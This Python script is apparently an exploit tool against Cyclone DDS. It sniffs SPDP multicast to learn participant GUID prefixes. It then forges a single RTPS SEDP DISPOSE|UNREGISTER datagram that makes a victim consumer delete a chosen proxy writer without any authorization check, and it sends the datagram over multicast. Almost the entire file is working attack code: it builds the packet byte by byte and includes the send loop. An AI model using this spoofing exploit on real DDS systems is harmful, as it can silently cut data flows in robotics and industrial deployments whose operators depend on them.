#!/usr/bin/env python3
"""Module 1 forger: emit ONE keyed RTPS SEDP-publications DISPOSE|UNREGISTER that
names the target writer's GUID, so the victim consumer's Cyclone deletes that proxy
writer (q_ddsi_discovery.c handle_sedp_dead_endpoint -> ddsi_delete_proxy_writer)
with NO source/authorization check. Piggybacks on the real injector participant's
already-matched builtin SEDP writer 0x3c2 (roadmap 'hybrid'), so no from-scratch
SPDP/reliability is needed. Wire contract confirmed from source:
  PID_ENDPOINT_GUID=0x5a (q_protocol.h:426), PID_STATUSINFO=0x71 read big-endian
  (ddsi_plist.c:394), DATA flags E|Q|D, PL_CDR_LE payload encapsulation.
"""
import socket, struct, sys, binascii, time

SEDP_PUB_WRITER = 0x000003c2
SEDP_PUB_READER = 0x000003c7
MC_GRP, MC_PORT = "239.255.0.1", 7400

def h2b(s): return binascii.unhexlify(s.replace(":",""))

def sniff_participants(secs=6.0):
    """Map __ProcessName -> (guidprefix_bytes, metatraffic_locators) from SPDP."""
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("",MC_PORT))
    mreq=struct.pack("4s4s",socket.inet_aton(MC_GRP),socket.inet_aton("127.0.0.1"))
    s.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,mreq)
    s.settimeout(secs)
    found={}
    t0=time.time()
    while time.time()-t0<secs:
        try: data,_=s.recvfrom(65535)
        except socket.timeout: break
        if data[:4]!=b'RTPS': continue
        pfx=data[8:20]
        name=None
        if b'__ProcessName' in data:
            i=data.find(b'__ProcessName')
            # value follows as a length-prefixed string in the property block; scan printable
            seg=data[i+14:i+80]
            name=bytes(c for c in seg.split(b'\x00\x00')[0] if 32<=c<127).decode('latin1','ignore')
        found[binascii.hexlify(pfx).decode()]=name
    s.close()
    return found

def build_datagram(src_prefix, dst_prefix, target_guid, seqnum=1):
    assert len(src_prefix)==12 and len(dst_prefix)==12 and len(target_guid)==16
    m=bytearray()
    # RTPS header
    m+=b'RTPS'; m+=bytes([2,1,1,0x10]); m+=src_prefix
    # INFO_DST (0x0e), LE, octetsToNext=12
    m+=bytes([0x0e,0x01]); m+=struct.pack('<H',12); m+=dst_prefix
    # DATA (0x15), flags E|Q|D=0x07
    data=bytearray()
    data+=struct.pack('<H',0)          # extraFlags
    data+=struct.pack('<H',16)         # octetsToInlineQos
    data+=struct.pack('>I',SEDP_PUB_READER)  # readerId (entityids are big-endian on wire)
    data+=struct.pack('>I',SEDP_PUB_WRITER)  # writerId
    data+=struct.pack('<iI',0,seqnum)  # writerSN high(0) low(seq)
    # inlineQos ParameterList
    iq=bytearray()
    iq+=struct.pack('<HH',0x71,4); iq+=struct.pack('>I',0x00000003)  # STATUSINFO dispose|unreg, BE
    iq+=struct.pack('<HH',0x01,0)  # SENTINEL
    data+=iq
    # serializedPayload: encaps PL_CDR_LE + ParameterList{ENDPOINT_GUID, SENTINEL}
    pl=bytearray()
    pl+=bytes([0x00,0x03,0x00,0x00])                     # PL_CDR_LE, options 0
    pl+=struct.pack('<HH',0x5a,16); pl+=target_guid      # PID_ENDPOINT_GUID
    pl+=struct.pack('<HH',0x01,0)                        # SENTINEL
    data+=pl
    m+=bytes([0x15,0x07]); m+=struct.pack('<H',len(data)); m+=data
    # HEARTBEAT (0x07), flags E|FINAL=0x03, octetsToNext=28
    hb=bytearray()
    hb+=struct.pack('>I',SEDP_PUB_READER); hb+=struct.pack('>I',SEDP_PUB_WRITER)
    hb+=struct.pack('<iI',0,seqnum)   # firstSN
    hb+=struct.pack('<iI',0,seqnum)   # lastSN
    hb+=struct.pack('<I',1)           # count
    m+=bytes([0x07,0x03]); m+=struct.pack('<H',len(hb)); m+=hb
    return bytes(m)

if __name__=="__main__":
    import argparse
    ap=argparse.ArgumentParser()
    ap.add_argument("--src",required=True,help="injector guidprefix hex(24)")
    ap.add_argument("--dst",required=True,help="consumer guidprefix hex(24)")
    ap.add_argument("--target",required=True,help="target writer GUID hex(32)")
    ap.add_argument("--seq",type=int,default=1)
    ap.add_argument("--dport",type=int,default=MC_PORT)
    ap.add_argument("--daddr",default=MC_GRP)
    ap.add_argument("--repeat",type=int,default=1)
    a=ap.parse_args()
    dg=build_datagram(h2b(a.src),h2b(a.dst),h2b(a.target),a.seq)
    print(f"forged datagram {len(dg)}B -> {a.daddr}:{a.dport}")
    print(binascii.hexlify(dg).decode())
    tx=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
    tx.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,1)
    tx.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_IF,socket.inet_aton("127.0.0.1"))
    for i in range(a.repeat):
        tx.sendto(dg,(a.daddr,a.dport)); time.sleep(0.05)
    print("sent.")
